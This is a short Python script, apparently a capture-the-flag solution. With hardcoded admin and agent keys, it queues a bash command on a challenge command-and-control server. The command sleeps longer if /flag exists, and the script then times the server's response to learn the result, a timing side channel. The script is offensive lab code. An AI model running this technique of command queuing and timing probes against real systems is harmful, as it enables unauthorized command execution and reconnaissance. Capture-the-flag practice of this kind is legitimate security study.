````python
import requests
import time
import json

# CONFIG
HOST = "https://4f044b22-3d32-4be4-92f3-1435a2f37cb5.openec.sc:1337/"               # C2 server URL
ADMIN_KEY = "f682917761bec2170d4b0af6bfc4be2b"   # Admin key
AGENT_KEY = "db46119b4e1c441ca156210d338ea6d9"   # Agent key
AGENT_ID = "2b68a864f67c2961"                   # Agent ID

HEADERS_ADD = {
    "admin-key": ADMIN_KEY,
    "Content-Type": "application/json"
}

HEADERS_GET = {
    "agent-key": AGENT_KEY,
    "Content-Type": "application/json"
}

def add_task(task_payload):
    url = f"{HOST}/add_task"
    data = json.dumps({AGENT_ID: task_payload})
    resp = requests.post(url, headers=HEADERS_ADD, data=data)
    return resp.status_code

def register(task_payload):
    url = f"{HOST}/register"
    data = json.dumps({"agent_id": AGENT_ID})
    resp = requests.post(url, headers=HEADERS_GET, data=data)
    return resp.status_code

def get_tasks():
    url = f"{HOST}/get_tasks"
    data = json.dumps({"agent_id": AGENT_ID})
    start = time.time()
    resp = requests.post(url, headers=HEADERS_GET, data=data)
    end = time.time()
    return resp, end-start

resp, duration = get_tasks()

print(f"GET /get_tasks duration: {duration:.2f} seconds")
print("Response:", resp.text)

# Step 1 — send a sleep task
sleep_task = [["bash","-c","date; if [ -f /flag ]; then sleep 30; else sleep 5; fi; date"]]
add_task(sleep_task)

# Step 2 — fetch tasks and measure time
resp, duration = get_tasks()

print(f"GET /get_tasks duration: {duration:.2f} seconds")
print("Response:", resp.text)
````
